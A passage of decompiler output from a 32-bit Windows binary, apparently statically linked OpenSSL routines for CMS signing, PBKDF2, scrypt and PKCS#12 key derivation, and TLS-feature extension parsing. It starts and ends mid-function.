  v4 = *a2;
  switch ( a1 )
  {
    case 10:
      if ( sub_4CED20((_DWORD *)(a4 + 8), v4) <= 0 )
        goto LABEL_5;
      goto LABEL_4;
    case 11:
    case 13:
      if ( sub_4CE200(v4, *(int ***)(a4 + 4)) > 0 )
        goto LABEL_7;
      goto LABEL_5;
    case 12:
LABEL_4:
      v5 = sub_4CE120(v4, *(int **)a4);
      *(_DWORD *)(a4 + 4) = v5;
      if ( v5 )
        goto LABEL_7;
LABEL_5:
      result = 0;
      break;
    default:
LABEL_7:
      result = 1;
      break;
  }
  return result;
}

//----- (00479A80) --------------------------------------------------------
void *sub_479A80()
{
  return &unk_522C84;
}

//----- (00479A90) --------------------------------------------------------
void *sub_479A90()
{
  return &unk_522CF8;
}

//----- (00479AA0) --------------------------------------------------------
signed int __cdecl sub_479AA0(void **a1, int a2, int a3, int a4)
{
  int v4; // eax
  int v6[3]; // [esp+0h] [ebp-1Ch] BYREF
  int v7[4]; // [esp+Ch] [ebp-10h] BYREF

  v4 = 8 * a4;
  LOBYTE(a4) = (unsigned int)(8 * a4) >> 24;
  HIBYTE(a4) = v4;
  v7[0] = 4;
  v7[1] = 4;
  BYTE2(a4) = BYTE1(v4);
  BYTE1(a4) = BYTE2(v4);
  v6[0] = a2;
  v6[1] = a3;
  v7[2] = (int)&a4;
  v7[3] = 0;
  v6[2] = (int)v7;
  return sub_42F620((int)v6, a1, (int)&unk_522E14);
}

//----- (00479B20) --------------------------------------------------------
int __usercall sub_479B20@<eax>(int a1@<esi>)
{
  int i; // edi
  int v2; // eax
  int j; // edi
  int v4; // edi
  int result; // eax
  int v6; // eax

  for ( i = 0; i < sub_426A30(*(_DWORD *)(a1 + 12)); ++i )
  {
    v2 = *(_DWORD *)sub_426A40(*(int **)(a1 + 12), i);
    if ( v2 == 4 )
    {
      if ( *(int *)a1 < 5 )
        *(_DWORD *)a1 = 5;
    }
    else if ( v2 == 3 )
    {
      if ( *(int *)a1 < 4 )
        *(_DWORD *)a1 = 4;
    }
    else if ( v2 == 2 && *(int *)a1 < 3 )
    {
      *(_DWORD *)a1 = 3;
    }
  }
  for ( j = 0; j < sub_426A30(*(_DWORD *)(a1 + 16)); ++j )
  {
    if ( *(_DWORD *)sub_426A40(*(int **)(a1 + 16), j) == 1 && *(int *)a1 < 5 )
      *(_DWORD *)a1 = 5;
  }
  if ( sub_423680(**(_DWORD **)(a1 + 8)) != 21 && *(int *)a1 < 3 )
    *(_DWORD *)a1 = 3;
  v4 = 0;
  result = sub_426A30(*(_DWORD *)(a1 + 20));
  if ( result > 0 )
  {
    do
    {
      v6 = sub_426A40(*(int **)(a1 + 20), v4);
      if ( **(_DWORD **)(v6 + 4) == 1 )
      {
        if ( *(int *)v6 < 3 )
          *(_DWORD *)v6 = 3;
        if ( *(int *)a1 < 3 )
          *(_DWORD *)a1 = 3;
      }
      else if ( *(int *)v6 < 1 )
      {
        *(_DWORD *)v6 = 1;
      }
      ++v4;
      result = sub_426A30(*(_DWORD *)(a1 + 20));
    }
    while ( v4 < result );
  }
  if ( *(int *)a1 < 1 )
    *(_DWORD *)a1 = 1;
  return result;
}

//----- (00479C60) --------------------------------------------------------
int __usercall sub_479C60@<eax>(int a1@<edx>, int a2)
{
  int v2; // eax
  int v3; // ecx
  int (__cdecl *v4)(int, int, int, int); // ecx
  int v5; // eax

  v2 = *(_DWORD *)(a1 + 32);
  v3 = *(_DWORD *)(v2 + 12);
  if ( !v3 )
    return 1;
  v4 = *(int (__cdecl **)(int, int, int, int))(v3 + 92);
  if ( !v4 )
    return 1;
  v5 = v4(v2, 5, a2, a1);
  if ( v5 == -2 )
  {
    sub_408310(46, 170, 125, (int)"crypto\\cms\\cms_sd.c", 210);
    return 0;
  }
  if ( v5 > 0 )
    return 1;
  sub_408310(46, 170, 111, (int)"crypto\\cms\\cms_sd.c", 214);
  return 0;
}

//----- (00479CD0) --------------------------------------------------------
_DWORD *__cdecl sub_479CD0(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5)
{
  _DWORD *result; // eax

  if ( a2 )
    *a2 = a1[8];
  if ( a3 )
    *a3 = a1[7];
  if ( a4 )
    *a4 = a1[2];
  result = a5;
  if ( a5 )
    *a5 = a1[4];
  return result;
}

//----- (00479D10) --------------------------------------------------------
int __cdecl sub_479D10(int *Block)
{
  int *v1; // esi
  int *v2; // eax
  BOOL v3; // ebx
  _BYTE *v4; // edi
  int v5; // eax
  char *v6; // eax
  int *v7; // ebp
  char *v8; // eax
  int v9; // edi
  void *v10; // eax
  int *v11; // eax
  int v13; // [esp-4h] [ebp-20h]
  int v14; // [esp+10h] [ebp-Ch] BYREF
  size_t Size; // [esp+14h] [ebp-8h] BYREF
  _BYTE *v16; // [esp+18h] [ebp-4h]

  v1 = Block;
  v2 = (int *)Block[2];
  v3 = 0;
  Block = 0;
  v4 = (_BYTE *)v1[9];
  v13 = *v2;
  v16 = v4;
  v5 = sub_423680(v13);
  v6 = sub_4233A0(v5);
  v7 = (int *)sub_430D80((int)v6);
  if ( !v7 )
    return 0;
  if ( sub_4CED90((int)v1, 0x34u, -1) < 0 )
  {
    v8 = (char *)sub_454F90(0, 0);
    v9 = (int)v8;
    if ( v8 )
      v3 = sub_4CEDA0((int)v1, 52, *((_DWORD *)v8 + 1), v8, -1) > 0;
    sub_430E00(v9);
    if ( !v3 )
    {
      sub_408310(46, 103, 65, (int)"crypto\\cms\\cms_sd.c", 396);
      v4 = v16;
LABEL_20:
      sub_413490(Block);
      sub_42B790(v4);
      return 0;
    }
    v4 = v16;
  }
  if ( v1[10] )
  {
    v14 = v1[10];
  }
  else
  {
    sub_42B790(v4);
    if ( sub_44FE10((int)v4, &v14, v7, 0, v1[8]) <= 0 )
      goto LABEL_20;
  }
  if ( sub_443A60(v14, -1, 8, 11, 0, (int)v1) <= 0 )
  {
    sub_408310(46, 151, 110, (int)"crypto\\cms\\cms_sd.c", 663);
    goto LABEL_20;
  }
  v10 = sub_479A80();
  sub_42F620(v1[3], (void **)&Block, (int)v10);
  if ( !Block )
    goto LABEL_20;
  if ( sub_42BA10((int)v4) <= 0 )
    goto LABEL_20;
  if ( sub_44FE70((int)v4, 0, &Size) <= 0 )
    goto LABEL_20;
  sub_413490(Block);
  v11 = (int *)sub_4133F0(Size);
  Block = v11;
  if ( !v11 || sub_44FE70((int)v4, (int)v11, &Size) <= 0 )
    goto LABEL_20;
  if ( sub_443A60(v14, -1, 8, 11, 1, (int)v1) <= 0 )
  {
    sub_408310(46, 151, 110, (int)"crypto\\cms\\cms_sd.c", 684);
    goto LABEL_20;
  }
  sub_42B790(v4);
  sub_4329C0(v1[5], (int)Block, Size);
  return 1;
}

//----- (00479F30) --------------------------------------------------------
volatile LONG *__cdecl sub_479F30(int *a1)
{
  volatile LONG *v1; // ebx
  int v3; // esi
  int v4; // edi
  _DWORD *v5; // eax
  volatile LONG *v6; // eax

  v1 = 0;
  if ( sub_423680(*a1) == 22 )
  {
    v3 = a1[1];
    if ( v3 )
    {
      if ( *(_DWORD *)(*(_DWORD *)(v3 + 8) + 8) )
        sub_479B20(v3);
      v4 = 0;
      if ( sub_426A30(*(_DWORD *)(v3 + 4)) <= 0 )
      {
        return v1;
      }
      else
      {
        while ( 1 )
        {
          v5 = (_DWORD *)sub_426A40(*(int **)(v3 + 4), v4);
          v6 = sub_4CDF40(v5);
          if ( !v6 )
            break;
          if ( v1 )
            sub_4054B0(v1, (int)v6);
          else
            v1 = v6;
          if ( ++v4 >= sub_426A30(*(_DWORD *)(v3 + 4)) )
            return v1;
        }
        sub_405550(v1);
        return 0;
      }
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_408310(46, 133, 108, (int)"crypto\\cms\\cms_sd.c", 26);
    return 0;
  }
}

//----- (00479FE0) --------------------------------------------------------
int __usercall sub_479FE0@<eax>(int **a1@<ecx>, int a2@<esi>, int a3)
{
  _BYTE **v4; // edi
  char *v6; // ebx
  void *v7; // ebp
  void *v8; // ebx
  int v9; // eax
  void *v10; // eax
  void *v11; // ebx
  size_t Size; // [esp+Ch] [ebp-54h] BYREF
  int v13; // [esp+10h] [ebp-50h] BYREF
  int v14; // [esp+14h] [ebp-4Ch]
  void *Block; // [esp+18h] [ebp-48h]
  char Src[64]; // [esp+1Ch] [ebp-44h] BYREF

  v4 = (_BYTE **)sub_42B820();
  v14 = 0;
  Block = 0;
  if ( !v4 )
  {
    sub_408310(46, 150, 65, (int)"crypto\\cms\\cms_sd.c", 541);
    return 0;
  }
  if ( *(_DWORD *)(a2 + 32) )
  {
    if ( !sub_4CDFF0((int)v4, a1, *(_DWORD **)(a2 + 8)) || *(_DWORD *)(a2 + 40) && !sub_479C60(a2, 0) )
      goto LABEL_28;
    if ( sub_4CED80(a2) < 0 )
    {
      if ( *(_DWORD *)(a2 + 40) )
      {
        v7 = *(void **)(a2 + 40);
        Block = v7;
        if ( !sub_42BA20(v4, (int)Src, &v13) )
          goto LABEL_28;
        Size = sub_41CA90(*(_DWORD *)(a2 + 32));
        v8 = sub_4133F0(Size);
        if ( !v8 )
        {
          sub_408310(46, 150, 65, (int)"crypto\\cms\\cms_sd.c", 587);
          goto LABEL_28;
        }
        if ( sub_453B20((int *)v7, (int)v8, &Size, (int)Src, v13) <= 0 )
        {
          sub_413490(v8);
          goto LABEL_28;
        }
        sub_4329C0(*(_DWORD *)(a2 + 20), (int)v8, Size);
      }
      else
      {
        v9 = sub_41CA90(*(_DWORD *)(a2 + 32));
        v10 = sub_4133F0(v9);
        v11 = v10;
        if ( !v10 )
        {
          sub_408310(46, 150, 65, (int)"crypto\\cms\\cms_sd.c", 600);
          goto LABEL_28;
        }
        if ( !sub_454D80(v4, (int)v10, &v13, *(_DWORD *)(a2 + 32)) )
        {
          sub_408310(46, 150, 139, (int)"crypto\\cms\\cms_sd.c", 604);
          sub_413490(v11);
          goto LABEL_28;
        }
        sub_4329C0(*(_DWORD *)(a2 + 20), (int)v11, v13);
      }
    }
    else
    {
      v6 = **(char ***)(*(_DWORD *)(a3 + 4) + 8);
      if ( !sub_42BA20(v4, (int)Src, &Size)
        || !sub_4CEDA0(a2, 51, 4, Src, Size)
        || sub_4CEDA0(a2, 50, 6, v6, -1) <= 0
        || !sub_479D10((int *)a2) )
      {
        goto LABEL_28;
      }
    }
    v14 = 1;
    goto LABEL_28;
  }
  sub_408310(46, 150, 133, (int)"crypto\\cms\\cms_sd.c", 546);
LABEL_28:
  sub_42B840(v4);
  sub_443A10((volatile LONG **)Block);
  return v14;
}

//----- (0047A290) --------------------------------------------------------
int __cdecl sub_47A290(int *a1, int **a2)
{
  int *v2; // ebx
  int v3; // eax
  int v4; // edi
  int v5; // eax

  if ( sub_423680(*a1) == 22 )
  {
    v3 = a1[1];
    if ( v3 )
      v2 = *(int **)(v3 + 20);
    else
      v2 = 0;
  }
  else
  {
    sub_408310(46, 133, 108, (int)"crypto\\cms\\cms_sd.c", 26);
    v2 = 0;
  }
  v4 = 0;
  if ( sub_426A30((int)v2) <= 0 )
  {
LABEL_9:
    *(_DWORD *)(*(_DWORD *)(a1[1] + 8) + 8) = 0;
    return 1;
  }
  else
  {
    while ( 1 )
    {
      v5 = sub_426A40(v2, v4);
      if ( !sub_479FE0(a2, v5, (int)a1) )
        return 0;
      if ( ++v4 >= sub_426A30((int)v2) )
        goto LABEL_9;
    }
  }
}

//----- (0047A330) --------------------------------------------------------
int __cdecl sub_47A330(int a1, int *a2)
{
  int *v2; // edi
  int v3; // ebx
  int v5; // esi
  _BYTE *v6; // eax

  v2 = a2;
  v3 = 0;
  if ( !a2 )
    return 0;
  if ( (a2[1] & 0x100) != 0 )
  {
    if ( sub_405110(a1, (int)"-", 1) != 1 )
      return -1;
    v3 = 1;
  }
  if ( *v2 )
  {
    v5 = 0;
    if ( *v2 <= 0 )
      return v3;
    while ( 1 )
    {
      if ( v5 && !(v5 % 35) )
      {
        if ( sub_405110(a1, (int)"\\\n", 2) != 2 )
          return -1;
        v3 += 2;
      }
      v6 = (_BYTE *)(v2[2] + v5);
      LOBYTE(a2) = off_5353F4[(unsigned __int8)*v6 >> 4];
      BYTE1(a2) = off_5353F4[*v6 & 0xF];
      if ( sub_405110(a1, (int)&a2, 2) != 2 )
        break;
      ++v5;
      v3 += 2;
      if ( v5 >= *v2 )
        return v3;
    }
  }
  else if ( sub_405110(a1, (int)"00", 2) == 2 )
  {
    v3 += 2;
    return v3;
  }
  return -1;
}
// 5353F4: using guessed type char *off_5353F4;

//----- (0047A430) --------------------------------------------------------
int __cdecl sub_47A430(int **a1, char *a2, int a3, int *a4, int a5, int a6, int a7)
{
  int v7; // esi
  int v8; // edi
  int v10; // [esp+10h] [ebp-68h]
  unsigned __int64 v11; // [esp+14h] [ebp-64h] BYREF
  unsigned __int64 v12; // [esp+1Ch] [ebp-5Ch] BYREF
  unsigned __int64 v13; // [esp+24h] [ebp-54h] BYREF
  int v14[2]; // [esp+2Ch] [ebp-4Ch] BYREF
  char v15[64]; // [esp+34h] [ebp-44h] BYREF

  v7 = 0;
  v10 = 0;
  if ( sub_435D30((int)a1) )
  {
    v7 = sub_423FE0((int *)&unk_522F1C, a4);
    if ( v7 )
    {
      v8 = sub_407470((int)a1);
      if ( !*(_DWORD *)(v7 + 16) || sub_431820(v14, *(unsigned int **)(v7 + 16)) && v14[0] == v8 && !v14[1] )
      {
        if ( sub_431820(&v12, *(unsigned int **)(v7 + 4))
          && sub_431820(&v11, *(unsigned int **)(v7 + 8))
          && sub_431820(&v13, *(unsigned int **)(v7 + 12))
          && sub_4CF370(0, 0, 0, 0, v12, v11, v13, 0i64, 0, 0) )
        {
          if ( sub_4CF370(a2, a3, *(_DWORD *)(*(_DWORD *)v7 + 8), **(_DWORD **)v7, v12, v11, v13, 0i64, v15, v8) )
            v10 = sub_406270(a1, 0, 0, (int)v15, 0, a7);
        }
        else
        {
          sub_408310(6, 180, 171, (int)"crypto\\asn1\\p5_scrypt.c", 269);
        }
      }
      else
      {
        sub_408310(6, 180, 123, (int)"crypto\\asn1\\p5_scrypt.c", 259);
      }
      if ( v8 )
        sub_4139E0(v15, v8);
    }
    else
    {
      sub_408310(6, 180, 114, (int)"crypto\\asn1\\p5_scrypt.c", 246);
    }
  }
  else
  {
    sub_408310(6, 180, 131, (int)"crypto\\asn1\\p5_scrypt.c", 237);
  }
  sub_42FEF0(v7, (int)&unk_522F1C);
  return v10;
}
// 47A430: using guessed type char var_44[64];

//----- (0047A650) --------------------------------------------------------
int __cdecl sub_47A650(char *a1, int a2, int a3, int a4, int a5, int *a6, int a7, char *a8)
{
  int **v9; // ecx
  int v11; // eax
  _DWORD *v12; // edi
  signed int v13; // ebp
  int **v14; // esi
  _BYTE *v15; // eax
  signed int v16; // esi
  int **Block; // [esp+Ch] [ebp-60h]
  int v18; // [esp+14h] [ebp-58h]
  int v19; // [esp+18h] [ebp-54h]
  int v20; // [esp+1Ch] [ebp-50h]
  int Size; // [esp+20h] [ebp-4Ch]
  char Src[64]; // [esp+28h] [ebp-44h] BYREF

  v18 = 1;
  Size = sub_407480((int)a6);
  if ( Size < 0 )
    return 0;
  v9 = (int **)sub_4CB050();
  Block = v9;
  if ( !v9 )
    return 0;
  v19 = a7;
  if ( a1 )
  {
    v11 = a2;
    if ( a2 == -1 )
    {
      v11 = strlen(a1);
      v9 = Block;
    }
  }
  else
  {
    v11 = 0;
  }
  if ( sub_4CAB30(v9, a1, v11, a6, 0) && (v12 = sub_4CB050()) != 0 )
  {
    if ( a7 )
    {
      while ( 1 )
      {
        v13 = Size;
        if ( v19 <= Size )
          v13 = v19;
        v14 = Block;
        if ( !sub_4CAF60(v12, Block) || !sub_4CAD60(v12) || !sub_4CAD60(v12) || !sub_4CAD80(v12, (int)Src, 0) )
          break;
        sub_4CAEA0((int)v12);
        memcpy(a8, Src, v13);
        v20 = 1;
        if ( a5 > 1 )
        {
          while ( sub_4CAF60(v12, v14) && sub_4CAD60(v12) && sub_4CAD80(v12, (int)Src, 0) )
          {
            sub_4CAEA0((int)v12);
            if ( v13 > 0 )
            {
              v15 = a8;
              v16 = v13;
              do
              {
                *v15 ^= v15[Src - a8];
                ++v15;
                --v16;
              }
              while ( v16 );
              v14 = Block;
            }
            if ( ++v20 >= a5 )
              goto LABEL_27;
          }
          break;
        }
LABEL_27:
        ++v18;
        a8 += v13;
        v19 -= v13;
        if ( !v19 )
          goto LABEL_28;
      }
      sub_4CAE30((_BYTE **)v12);
      sub_4CAE30((_BYTE **)v14);
      return 0;
    }
    else
    {
LABEL_28:
      sub_4CAE30((_BYTE **)v12);
      sub_4CAE30((_BYTE **)Block);
      return 1;
    }
  }
  else
  {
    sub_4CAE30((_BYTE **)Block);
    return 0;
  }
}

//----- (0047A920) --------------------------------------------------------
int __cdecl sub_47A920(int **a1, int a2, int a3, int *a4, int a5, int a6, int a7)
{
  int v7; // ebp
  int *v8; // eax
  int **v9; // eax
  int **v10; // esi
  int v12; // eax
  int v13; // eax
  char *v14; // eax
  int *v15; // eax
  int (__cdecl *v16)(int **, int, int, int, _DWORD, _DWORD, int); // [esp+8h] [ebp-4h] BYREF

  v7 = 0;
  v8 = (int *)sub_47FD20();
  v9 = (int **)sub_423FE0(v8, a4);
  v10 = v9;
  if ( !v9 )
  {
    sub_408310(6, 118, 114, (int)"crypto\\evp\\p5_crpt2.c", 162);
    sub_47FD30(0);
    return 0;
  }
  v12 = sub_423680(**v9);
  if ( !sub_44BC00(2, v12, 0, 0, &v16) )
  {
    sub_408310(6, 118, 124, (int)"crypto\\evp\\p5_crpt2.c", 170);
    sub_47FD30((int)v10);
    return 0;
  }
  v13 = sub_423680(*v10[1]);
  v14 = sub_4233A0(v13);
  v15 = (int *)sub_430D50((int)v14);
  if ( !v15 )
  {
    sub_408310(6, 118, 107, (int)"crypto\\evp\\p5_crpt2.c", 181);
    sub_47FD30((int)v10);
    return 0;
  }
  if ( sub_406270(a1, v15, 0, 0, 0, a7) )
  {
    if ( sub_407960((int)a1, (_DWORD *)v10[1][1]) < 0 )
    {
      sub_408310(6, 118, 122, (int)"crypto\\evp\\p5_crpt2.c", 189);
      sub_47FD30((int)v10);
      return 0;
    }
    v7 = v16(a1, a2, a3, (*v10)[1], 0, 0, a7);
  }
  sub_47FD30((int)v10);
  return v7;
}

//----- (0047AA90) --------------------------------------------------------
int __cdecl sub_47AA90(int **a1, char *a2, int a3, int *a4, int a5, int a6, int a7)
{
  int v7; // esi
  unsigned int v8; // edi
  int *v9; // eax
  int *v10; // eax
  int v11; // eax
  char *v12; // eax
  int *v13; // eax
  int v14; // ebx
  int v15; // ebp
  int v16; // eax
  int v18; // [esp+10h] [ebp-58h]
  int *v19; // [esp+14h] [ebp-54h]
  unsigned int v20; // [esp+20h] [ebp-48h] BYREF
  char v21[64]; // [esp+24h] [ebp-44h] BYREF

  v7 = 0;
  v18 = 0;
  v8 = 0;
  if ( sub_435D30((int)a1) )
  {
    v8 = sub_407470((int)a1);
    if ( v8 > 0x40 )
      sub_417C70("assertion failed: keylen <= sizeof key", "crypto\\evp\\p5_crpt2.c", 215);
    v9 = (int *)sub_47FD50();
    v7 = sub_423FE0(v9, a4);
    if ( v7 )
    {
      v8 = sub_407470((int)a1);
      if ( !*(_DWORD *)(v7 + 8) || sub_431860(*(unsigned int **)(v7 + 8)) == v8 )
      {
        v10 = *(int **)(v7 + 12);
        if ( v10 )
          v11 = sub_423680(*v10);
        else
          v11 = 163;
        if ( sub_44BC00(1, v11, 0, &v20, 0) )
        {
          v12 = sub_4233A0(v20);
          v19 = (int *)sub_430D80((int)v12);
          if ( v19 )
          {
            if ( **(_DWORD **)v7 == 4 )
            {
              v13 = *(int **)(*(_DWORD *)v7 + 4);
              v14 = v13[2];
              v15 = *v13;
              v16 = sub_431860(*(unsigned int **)(v7 + 4));
              if ( sub_47A650(a2, a3, v14, v15, v16, v19, v8, v21) )
                v18 = sub_406270(a1, 0, 0, (int)v21, 0, a7);
            }
            else
            {
              sub_408310(6, 164, 126, (int)"crypto\\evp\\p5_crpt2.c", 252);
            }
          }
          else
          {
            sub_408310(6, 164, 125, (int)"crypto\\evp\\p5_crpt2.c", 247);
          }
        }
        else
        {
          sub_408310(6, 164, 125, (int)"crypto\\evp\\p5_crpt2.c", 241);
        }
      }
      else
      {
        sub_408310(6, 164, 123, (int)"crypto\\evp\\p5_crpt2.c", 231);
      }
    }
    else
    {
      sub_408310(6, 164, 114, (int)"crypto\\evp\\p5_crpt2.c", 222);
    }
  }
  else
  {
    sub_408310(6, 164, 131, (int)"crypto\\evp\\p5_crpt2.c", 211);
  }
  sub_4139E0(v21, v8);
  sub_47FD60(v7);
  return v18;
}
// 47AA90: using guessed type char var_44[64];

//----- (0047ACB0) --------------------------------------------------------
int __cdecl sub_47ACB0(int **a1, const char *a2, int a3, int *a4, int *a5, int *a6, int a7)
{
  int *v8; // eax
  int v9; // eax
  int **v10; // ebp
  int v11; // ebx
  int v12; // edi
  int v13; // eax
  int v14; // eax
  int v15; // esi
  int v16; // [esp+4h] [ebp-64h]
  char Src[16]; // [esp+14h] [ebp-54h] BYREF
  char v18[64]; // [esp+24h] [ebp-44h] BYREF

  if ( !a5 )
    return 0;
  v8 = (int *)sub_47FCF0();
  v9 = sub_423FE0(v8, a4);
  v10 = (int **)v9;
  if ( v9 )
  {
    if ( *(_DWORD *)(v9 + 4) )
      v16 = sub_431860(*(unsigned int **)(v9 + 4));
    else
      v16 = 1;
    v11 = **v10;
    v12 = (*v10)[2];
    v13 = sub_432B60((int)a5);
    if ( sub_4CFAF0(a2, a3, v12, v11, 1, v16, v13, v18, a6) )
    {
      v14 = sub_407400((int)a5);
      if ( sub_4CFAF0(a2, a3, v12, v11, 2, v16, v14, Src, a6) )
      {
        sub_47FD00((int)v10);
        v15 = sub_406270(a1, a5, 0, (int)v18, Src, a7);
        sub_4139E0(v18, 0x40u);
        sub_4139E0(Src, 0x10u);
        return v15;
      }
      else
      {
        sub_408310(35, 120, 106, (int)"crypto\\pkcs12\\p12_crpt.c", 61);
        sub_47FD00((int)v10);
        return 0;
      }
    }
    else
    {
      sub_408310(35, 120, 107, (int)"crypto\\pkcs12\\p12_crpt.c", 55);
      sub_47FD00((int)v10);
      return 0;
    }
  }
  else
  {
    sub_408310(35, 120, 101, (int)"crypto\\pkcs12\\p12_crpt.c", 43);
    return 0;
  }
}
// 47ACB0: using guessed type char var_44[64];

//----- (0047AE90) --------------------------------------------------------
int __cdecl sub_47AE90(int **a1, const char *a2, int a3, int *a4, int *a5, int *a6, int a7)
{
  int *v7; // eax
  int v8; // eax
  int v9; // ebx
  _BYTE **v11; // esi
  int v12; // edi
  int v13; // eax
  int v14; // eax
  int v15; // [esp-Ch] [ebp-C4h]
  int v16; // [esp+Ch] [ebp-ACh]
  int v17; // [esp+10h] [ebp-A8h]
  char v18[16]; // [esp+24h] [ebp-94h] BYREF
  char Src[16]; // [esp+34h] [ebp-84h] BYREF
  char v20[48]; // [esp+44h] [ebp-74h] BYREF
  _BYTE v21[64]; // [esp+74h] [ebp-44h] BYREF

  v17 = 0;
  if ( a4 && *a4 == 16 && a4[1] )
  {
    v7 = (int *)sub_47FCF0();
    v8 = sub_423FE0(v7, a4);
    v9 = v8;
    if ( !v8 )
    {
      sub_408310(6, 117, 114, (int)"crypto\\evp\\p5_crpt.c", 47);
      return 0;
    }
    if ( *(_DWORD *)(v8 + 4) )
      v16 = sub_431860(*(unsigned int **)(v8 + 4));
    else
      v16 = 1;
    if ( a2 && a3 == -1 )
      strlen(a2);
    v11 = (_BYTE **)sub_42B820();
    if ( !v11 )
    {
      sub_408310(6, 117, 65, (int)"crypto\\evp\\p5_crpt.c", 65);
      sub_42B840(0);
      return 0;
    }
    if ( sub_42B860((int)v11, a6, 0) )
    {
      if ( sub_42BA10((int)v11) )
      {
        if ( sub_42BA10((int)v11) )
        {
          sub_47FD00(v9);
          if ( sub_42BA20(v11, (int)Src, 0) )
          {
            if ( sub_407480((int)a6) < 0 )
              return 0;
            v12 = 1;
            if ( v16 <= 1 )
            {
LABEL_25:
              if ( sub_432B60((int)a5) > 64 )
                sub_417C70(
                  "assertion failed: EVP_CIPHER_key_length(cipher) <= (int)sizeof(md_tmp)",
                  "crypto\\evp\\p5_crpt.c",
                  89);
              v13 = sub_432B60((int)a5);
              memcpy(v21, Src, v13);
              if ( sub_407400((int)a5) > 16 )
                sub_417C70("assertion failed: EVP_CIPHER_iv_length(cipher) <= 16", "crypto\\evp\\p5_crpt.c", 91);
              v15 = sub_407400((int)a5);
              v14 = sub_407400((int)a5);
              memcpy(v18, &v20[-v14], v15);
              if ( sub_406270(a1, a5, 0, (int)v21, v18, a7) )
              {
                sub_4139E0(Src, 0x40u);
                sub_4139E0(v21, 0x40u);
                sub_4139E0(v18, 0x10u);
                v17 = 1;
              }
            }
            else
            {
              while ( sub_42B860((int)v11, a6, 0) && sub_42BA10((int)v11) && sub_42BA20(v11, (int)Src, 0) )
              {
                if ( ++v12 >= v16 )
                  goto LABEL_25;
              }
            }
          }
        }
      }
    }
    sub_42B840(v11);
    return v17;
  }
  else
  {
    sub_408310(6, 117, 114, (int)"crypto\\evp\\p5_crpt.c", 41);
    return 0;
  }
}
// 47AE90: using guessed type _BYTE var_44[64];
// 47AE90: using guessed type char var_74[48];

//----- (0047B1D0) --------------------------------------------------------
void *sub_47B1D0()
{
  return &unk_52308C;
}

//----- (0047B1E0) --------------------------------------------------------
int __cdecl sub_47B1E0(int a1, int *a2, int a3)
{
  int i; // edi
  unsigned int *v4; // esi
  int v5; // eax
  int v6; // ecx

  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v4 = (unsigned int *)sub_426A40(a2, i);
    v5 = sub_431860(v4);
    v6 = 0;
    while ( v5 != dword_5353F8[2 * v6] )
    {
      if ( (unsigned int)++v6 >= 2 )
      {
        sub_44D280(0, (int)v4, (int **)&a3);
        goto LABEL_6;
      }
    }
    sub_44CF10(0, (&off_5353FC)[2 * v6], (int **)&a3);
LABEL_6:
    ;
  }
  return a3;
}
// 47B248: conditional instruction was optimized away because ecx.4<2u
// 5353F8: using guessed type int dword_5353F8[];

//----- (0047B260) --------------------------------------------------------
int *__cdecl sub_47B260(int a1, int a2, int *a3)
{
  int *v3; // esi
  int v5; // ebx
  _DWORD *v6; // ebp
  const char *v7; // edi
  unsigned int i; // esi
  unsigned int v9; // esi
  _DWORD *v10; // eax
  int v11; // edi
  int *Block; // [esp+4h] [ebp-8h]
  char *EndPtr; // [esp+8h] [ebp-4h] BYREF

  v3 = sub_426AF0();
  Block = v3;
  if ( !v3 )
  {
    sub_408310(34, 165, 65, (int)"crypto\\x509v3\\v3_tlsf.c", 98);
    return 0;
  }
  v5 = 0;
  if ( sub_426A30((int)a3) > 0 )
  {
    while ( 2 )
    {
      v6 = (_DWORD *)sub_426A40(a3, v5);
      v7 = (const char *)v6[2];
      if ( !v7 )
        v7 = (const char *)v6[1];
      for ( i = 0; i < 2; ++i )
      {
        if ( !_stricmp(v7, (&off_5353FC)[2 * i]) )
        {
          v9 = dword_5353F8[2 * i];
          goto LABEL_12;
        }
      }
      v9 = strtol(v7, &EndPtr, 10);
      if ( *EndPtr || v7 == EndPtr || v9 > 0xFFFF )
      {
        sub_408310(34, 165, 143, (int)"crypto\\x509v3\\v3_tlsf.c", 118);
        sub_408610(6, "section:", *v6, ",name:", v6[1], ",value:", v6[2]);
      }
      else
      {
LABEL_12:
        v10 = sub_42C490();
        v11 = (int)v10;
        if ( v10 )
        {
          sub_431840((int)v10, v9);
          sub_4269B0(Block, v11);
          if ( ++v5 < sub_426A30((int)a3) )
            continue;
          return Block;
        }
        sub_408310(34, 165, 65, (int)"crypto\\x509v3\\v3_tlsf.c", 126);
      }
      break;
    }
    sub_426C00(Block, (void (__cdecl *)(_DWORD))sub_42C4F0);
    return 0;
  }
  return v3;
}
// 47B35B: conditional instruction was optimized away because esi.4<2u
// 5353F8: using guessed type int dword_5353F8[];

//----- (0047B3E0) --------------------------------------------------------
void *sub_47B3E0()
{
  return sub_4247B0("NULL");
}

//----- (0047B400) --------------------------------------------------------
int __cdecl sub_47B400(int a1, int *a2, int a3, int a4)
{
  sub_4D07F0(a2, a3, a4, "\n", 0);
  return 1;
}

//----- (0047B430) --------------------------------------------------------
_DWORD *__cdecl sub_47B430(int a1, int a2, char *a3)
{
  return sub_44D140(a1, a3);
}

//----- (0047B450) --------------------------------------------------------
void *sub_47B450()
{
  return &unk_523308;
}

//----- (0047B460) --------------------------------------------------------
void *sub_47B460()
{
  return &unk_523338;
}

//----- (0047B470) --------------------------------------------------------
void __cdecl sub_47B470(int a1)
{
  sub_42FEF0(a1, (int)&unk_523308);
}

//----- (0047B490) --------------------------------------------------------
int __cdecl sub_47B490(int a1, int *a2, int a3)
{
  int i; // esi
  int *v4; // edi
  int v6; // [esp+8h] [ebp-A8h] BYREF
  char v7[80]; // [esp+Ch] [ebp-A4h] BYREF
  char Src[80]; // [esp+5Ch] [ebp-54h] BYREF

  v6 = a3;
  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v4 = (int *)sub_426A40(a2, i);
    sub_4229E0(Src, 80, *v4);
    sub_4229E0(v7, 80, v4[1]);
    sub_44CF10(Src, v7, (int **)&v6);
  }
  return v6;
}

//----- (0047B540) --------------------------------------------------------
int *__cdecl sub_47B540(int a1, int a2, int *a3)
{
  void **v3; // esi
  void **v4; // edi
  int *v5; // ebx
  int v7; // ebp
  int v8; // eax
  int v9; // ebx
  char *v10; // eax
  char **v11; // eax
  void ***v12; // eax
  int *Block; // [esp+Ch] [ebp-4h]

  v3 = 0;
  v4 = 0;
  v5 = sub_426AF0();
  Block = v5;
  if ( v5 )
  {
